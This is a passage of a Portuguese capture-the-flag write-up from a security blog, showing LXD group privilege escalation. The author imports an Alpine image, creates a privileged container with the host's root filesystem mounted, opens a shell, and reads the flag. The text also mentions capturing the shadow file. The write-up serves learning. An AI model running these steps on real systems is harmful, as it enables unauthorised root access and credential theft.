src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F085e41cc-d1e2-4062-ac40-c4a7302656de%2FUntitled.png?width=1028&amp;table=block&amp;id=b1f76dc3-5b2c-489b-bf24-b281936b48a5" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b6762d0b22334c33920e8ac511dd54c1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/713dbe9b26cc4774b5f93b11dd807bef" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ <span class="token builtin class-name">cd</span> /tmp
$ <span class="token function">wget</span> http://192.168.1.5/alpine-v3.12-x86_64-20200806_1741.tar.gz
$ /snap/bin/lxc image <span class="token function">import</span> /tmp/alpine-v3.12-x86_64-20200806_1741.tar.gz --alias myimage</span></span></span></code></pre><div id="https://www.notion.so/343269a1affc45398563f7eb39e0dbef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2ae405df8ee9445681ea1c03c2c58b1c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7ac3c71e-db3a-4e15-83f1-5f4719e38f36%2FUntitled.png?width=940&amp;table=block&amp;id=2ae405df-8ee9-4456-81ea-1c03c2c58b1c"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7ac3c71e-db3a-4e15-83f1-5f4719e38f36%2FUntitled.png?width=940&amp;table=block&amp;id=2ae405df-8ee9-4456-81ea-1c03c2c58b1c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">Observe que o comando não aceita caminho relativo para a imagem</span></span></figcaption></figure></div><div id="https://www.notion.so/88bb22f4ca154d128658235648f232cc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8f1c7fc37c4c41bfa37d8e9fa5d54d4c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe1888215-2974-4b74-b15e-cf77a6302458%2FUntitled.png?width=1213&amp;table=block&amp;id=8f1c7fc3-7c4c-41bf-a37d-8e9fa5d54d4c"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe1888215-2974-4b74-b15e-cf77a6302458%2FUntitled.png?width=1213&amp;table=block&amp;id=8f1c7fc3-7c4c-41bf-a37d-8e9fa5d54d4c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">Imagem devidamente importada</span></span></figcaption></figure></div><div id="https://www.notion.so/13e943ddc4d94d508fa4a1dc1ea9177a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Vamos agora configurar e instanciar um novo container montando como &quot;disco externo&quot; a nossa raiz em um diretório /tmp/host .</span></span></p></div><div id="https://www.notion.so/edd21251fa6e4038a2547d969477da96" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/9cb68f98dc7f49ac95bacd267600a399" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5cf8e77b-6559-475f-860e-780cfcd940d8%2FUntitled.png?width=753&amp;table=block&amp;id=9cb68f98-dc7f-49ac-95ba-cd267600a399"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5cf8e77b-6559-475f-860e-780cfcd940d8%2FUntitled.png?width=753&amp;table=block&amp;id=9cb68f98-dc7f-49ac-95ba-cd267600a399" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/56f4f51556c84ef282430df2a449563f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a6e3d61296924c48954312bbcd4be389" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ao tentar inicializar o container o lxd nos informar que falta o storage pool. Isso pode ser um sinal de que o LXD não foi inicializado. Vamos inicializa-lo apontando como storage pool a opção dir, de diretório , já que não queremos usar uma partição específica para armazenamento.</span></span></p></div><div id="https://www.notion.so/2903727d7b50454f8f523f023dbfff84" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8f5b194558294b17b4ddc41ad76323a8" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa09dc23d-edda-4fdf-9559-a4c148140ee4%2FUntitled.png?width=916&amp;table=block&amp;id=8f5b1945-5829-4b17-b4dd-c41ad76323a8"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa09dc23d-edda-4fdf-9559-a4c148140ee4%2FUntitled.png?width=916&amp;table=block&amp;id=8f5b1945-5829-4b17-b4dd-c41ad76323a8" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/a5496494fc2049ad9bf8f445a24bf032" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Observe que na inicialização o único parâmetro alterado foi o Name of Storage Backend. Todos os outros foram deixados com a configuração default. Estamos atacando e não configurando um servidor, certo! ;D</span></span></p></div><div id="https://www.notion.so/2b48f6d30f2a457fa42884a9ea135d52" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/d69952f5e76e4dcbbf3e844f1c03b945" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#  myimage = nome da imagem que importamos</span>
<span class="token comment">#  mycontainer = nome do container que estamos inicializando </span>
$ lxc init myimage mycontainer -c security.privileged<span class="token operator">=</span>true

<span class="token comment">#  adicionando um device disk ao container</span>
<span class="token comment">#  source = / (O conteudo do disco será a raiz da vm!)</span>
<span class="token comment">#  path   = /mnt/host (Onde o disco será montado)</span>
$ lxc config device <span class="token function">add</span> mycontainer mydevice disk <span class="token assign-left variable">source</span><span class="token operator">=</span>/ <span class="token assign-left variable">path</span><span class="token operator">=</span>/mnt/host <span class="token assign-left variable">recursive</span><span class="token operator">=</span>true

<span class="token comment"># Inicializando o container</span>
$ lxc start mycontainer

<span class="token comment"># Executando no container o comando /bin/sh</span>
$ lxc <span class="token builtin class-name">exec</span> mycontainer /bin/sh</span></span></span></code></pre><div id="https://www.notion.so/079cac234b2c436b949e4c45bb54b762" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f45ebd3be1284f2d81f275535fbbe4e8" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F62024c96-da5f-43a4-bd17-e954eefa5c87%2FUntitled.png?width=1029&amp;table=block&amp;id=f45ebd3b-e128-4f2d-81f2-75535fbbe4e8"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F62024c96-da5f-43a4-bd17-e954eefa5c87%2FUntitled.png?width=1029&amp;table=block&amp;id=f45ebd3b-e128-4f2d-81f2-75535fbbe4e8" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c856be0d74284af888cdd7780aa444cc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Uma vez agora com o shell do container , vamos acessar o diretório que mapeou a nossa raiz e obter a flag.</span></span></p></div><div id="https://www.notion.so/85f23701b8e6450f856735e9bc69ed36" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/06391202c9484d628b4b607a9025c3a9" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc9658620-ebed-4d18-b104-dad560366e6d%2FUntitled.png?width=682&amp;table=block&amp;id=06391202-c948-4d62-8b4b-607a9025c3a9"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc9658620-ebed-4d18-b104-dad560366e6d%2FUntitled.png?width=682&amp;table=block&amp;id=06391202-c948-4d62-8b4b-607a9025c3a9" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/69eb602d374c4f799a0da207d807c557" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Missão cumprida. Como somos root e temos acesso a toda a raíz do host, podemos, se fosse o caso, efetuar outras alterações no sistema, capturar o shadow, etc. </span></span></p></div></article>
  <br/>
<script src="https://utteranc.es/client.js"
        repo="https://github.com/diegoalbuquerque/offensivethink-comments"
        issue-term="url"
        theme="github-dark-orange"
        crossorigin="anonymous"
        async>
</script>
<br/>
<footer class="Footer">
  <div>&copy; www.offensivethink.com 2019-2021</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>
</body>

</html>